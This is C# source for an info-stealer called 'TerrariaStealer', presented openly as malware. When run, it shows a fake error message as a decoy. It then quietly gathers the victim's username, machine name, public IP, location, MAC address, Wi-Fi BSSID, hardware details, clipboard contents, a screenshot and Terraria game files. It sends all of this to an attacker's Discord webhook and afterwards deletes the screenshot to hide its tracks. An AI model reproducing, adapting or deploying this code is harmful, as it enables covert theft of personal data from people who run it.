﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using JNogueira.Discord.Webhook.Client;
using System.Drawing;
using System.Threading;
using System.IO;
using System.Windows.Forms;
using System.Text;
using System.Text.RegularExpressions;

namespace TerrariaStealer // https://github.com/TheC0mpany/TerrariaStealer
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            #region Fake error
            if (DiscordWebhook.FakeError == true)
                MessageBox.Show(DiscordWebhook.FakeErrorMessage); // Shows fake error if its enabled in DiscordWebhook.cs
            #endregion

            #region exists or not
            Terraria.TerrariaExistOrNo();
            #endregion

            #region Rainbow Line gif
            string rainbowline = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here https://i.imgur.com/tcU8x8P.gif​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​";
            #endregion

            #region IP, IPv6, Country, City.
            // WebClient
            WebClient Amogus = new WebClient();
            // DNS host name
            String host = System.Net.Dns.GetHostName();
            // IP
            string IP = Amogus.DownloadString("https://ipapi.co/ip/");
            // IPv6
            System.Net.IPAddress IPv6 = Dns.GetHostEntry(host).AddressList[0];
            // Country
            string Country = Amogus.DownloadString("https://ipapi.co/country_name/");
            // City
            string City = Amogus.DownloadString("https://ipapi.co/city/");
            #endregion

            #region MAC Address
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            #endregion

            #region UserName
            // UserName
            string User = Environment.UserName;
            #endregion

            #region Discord Webhook
            // Discord Webhook
            var client = new DiscordWebhookClient(DiscordWebhook.defaultWebhook);
            #endregion

            #region Rainbow line message
            var rainbow = new DiscordMessage(
                rainbowline,
                username: "TerrariaStealer | TheC0mpany",
                avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                tts: false
                );
            #endregion

            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
            // Messages
            var message = new DiscordMessage(
                "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                username: "TerrariaStealer | TheC0mpany",
                avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                tts: false,
                embeds: new[]{
                    new DiscordMessageEmbed(
                        "TerrariaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Time: " + DateTime.Now.ToString("h:mm:ss")),
                        description:
                               "\n```Log date: " +  Help.date + "```" +
                               "\n ================================" +
                               "\n```UserName: " + User + "```" +
                               "\n```Machine Name: " + Environment.MachineName + "```" +
                               "\n```Active Window: " + SystemInfo.GetActiveWindowTitle() + "```" +
                               "\n```Launch: " + Help.ExploitName + "```" +
                               "\n ================================" +
                               "\n```OC: " + SystemInfo.GetSystemVersion() + "```" +
                               "\n```Screen Metrics: " + SystemInfo.ScreenMetrics() + "```" +
                               "\n```CPU: " + SystemInfo.GetCPUName() + "```" +
                               "\n```GPU: " + SystemInfo.GetGpuName() + "```" +
                               "\n```RAM: " + SystemInfo.GetRAM() + "```" +
                               "\n```BSSID: " + BSSID.GetBSSID() + "```" +
                               "\n ================================" +
                               "\n```IP: " + IP + "```" +
                               "\n```IPv6: " + IPv6 + "```" +
                               "\n```Country: " + Country + "```" +
                               "\n```City: " + City + "```" +
                               "\n```MAC Address: " + getTarget + "```" +
                               "\n ================================"
                               ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877226130640343090/newlog.gif"),
                        footer: new DiscordMessageEmbedFooter("TerrariaStealer | TheC0mpany", "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg")
                               )});;
            #endregion

            #region Grabbed programs, games, etc...
            var exists = new DiscordMessage(
                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "TerrariaStealer | TheC0mpany",
                 avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                 tts: false,
                 embeds: new[]{
                    new DiscordMessageEmbed(
                        "Exist | TerrariaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Exist - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                               "\nGames: " +
                               (Counting.Terraria > 0 ? "\n```Terraria```" : "")
                        ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877226130640343090/newlog.gif"),
                        footer: new DiscordMessageEmbedFooter("TerrariaStealer | TheC0mpany", "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg")
                               )});
            #endregion

            #region ClipBoard
            // Send cliboard with diffrent message because its can be long text and you will lost log data
            var clipboard = new DiscordMessage(
                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "TerrariaStealer | TheC0mpany",
                 avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                 tts: false,
                 embeds: new[]{
                    new DiscordMessageEmbed(
                        "Clipboard | TerrariaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Clipboard - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                        "\n```" + Buffer.GetBuffer() + "```"
                        ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877227264864055327/clipboard.gif"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877216643896459294/clipboard.gif"),
                        footer: new DiscordMessageEmbedFooter("TerrariaStealer | TheC0mpany", "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg")
                               )});
            #endregion

            #region Screenshot
            var screenshot = new DiscordMessage(
                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "TerrariaStealer | TheC0mpany",
                 avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                 tts: false,
                 embeds: new[]{
                    new DiscordMessageEmbed(
                        "Screenshot | TerrariaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Screenshot - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                        "\nScreenshot:"
                        ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg"),
                        footer: new DiscordMessageEmbedFooter("TerrariaStealer | TheC0mpany", "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg")
                               )});
            #endregion

            #region Terraria Message
            var terraria = new DiscordMessage(
                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                 username: "TerrariaStealer | TheC0mpany",
                 avatarUrl: "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg",
                 tts: false,
                 embeds: new[]{
                    new DiscordMessageEmbed(
                        "Terraria | TerrariaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("Terraria - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                        "\n ================================"
                        ,
                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg"),
                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877299612392751124/terraria.gif"),
                        footer: new DiscordMessageEmbedFooter("TerrariaStealer | TheC0mpany", "https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg")
                               )});
            #endregion

            #region Sending logs
            client.SendToDiscord(rainbow);
            Thread.Sleep(500);
            client.SendToDiscord(message);
            Thread.Sleep(500);
            client.SendToDiscord(rainbow);
            Thread.Sleep(500);
            client.SendToDiscord(clipboard);
            Thread.Sleep(500);
            client.SendToDiscord(rainbow);
            Thread.Sleep(500);
            client.SendToDiscord(exists);
            Thread.Sleep(500);
            #endregion

            #region Ghost ping
            string mssgBody = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ";
            #endregion

            #region Getting Screenshot
            Screenshot.GetScreenshot();
            #endregion

            #region Sending screenshot to discord webhook.
            string application = "";
            string filename1 = "Screenshot-" + Environment.MachineName + ".png";
            string fileformat1 = "png";
            string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";

            #region Terraria
            string filename2 = "input profiles.json";
            string fileformat2 = "json";
            string filepath2 = Terraria.inputprofilesPathh;

            string filename3 = "achievements.dat";
            string fileformat3 = "dat";
            string filepath3 = Terraria.achievementsPathh;

            string filename4 = "servers.dat";
            string fileformat4 = "dat";
            string filepath4 = Terraria.serversPathh;

            string filename5 = "favorites.json";
            string fileformat5 = "json";
            string filepath5 = Terraria.favoritesPathh;

            string filename6 = "config.json";
            string fileformat6 = "json";
            string filepath6 = Terraria.configPathh;
            #endregion
            try
            {
                client.SendToDiscord(rainbow);
                Thread.Sleep(500);
                client.SendToDiscord(terraria);
                Thread.Sleep(500);
                #region Terraria
                DiscordWebhook.SendFile(mssgBody, filename2, fileformat2, filepath2, application); // 
                Thread.Sleep(1500);
                DiscordWebhook.SendFile(mssgBody, filename3, fileformat3, filepath3, application); // 
                Thread.Sleep(1500);
                DiscordWebhook.SendFile(mssgBody, filename4, fileformat4, filepath4, application); // 
                Thread.Sleep(1500);
                DiscordWebhook.SendFile(mssgBody, filename5, fileformat5, filepath5, application); // 
                Thread.Sleep(1500);
                DiscordWebhook.SendFile(mssgBody, filename6, fileformat6, filepath6, application); // 
                Thread.Sleep(1500);
                #endregion
                client.SendToDiscord(rainbow);
                Thread.Sleep(1500);
            }
            catch
            {
                DiscordWebhook.Send("Terraria doesn't exists.");
            }
            try
            {
                client.SendToDiscord(screenshot);
                Thread.Sleep(500);
                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot
            }
            catch
            {
                DiscordWebhook.Send("Sending isn`t available. Maybe Screenshot size is more then 8 MB.");
            }
            #endregion

            client.SendToDiscord(rainbow);

            #region Delete screenshot file
            //Delete screenshot file
            Finish();
           
            void Finish()
            {
                Thread.Sleep(15000);
                File.Delete(@"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png");
            }
            #endregion
        }
    }
}
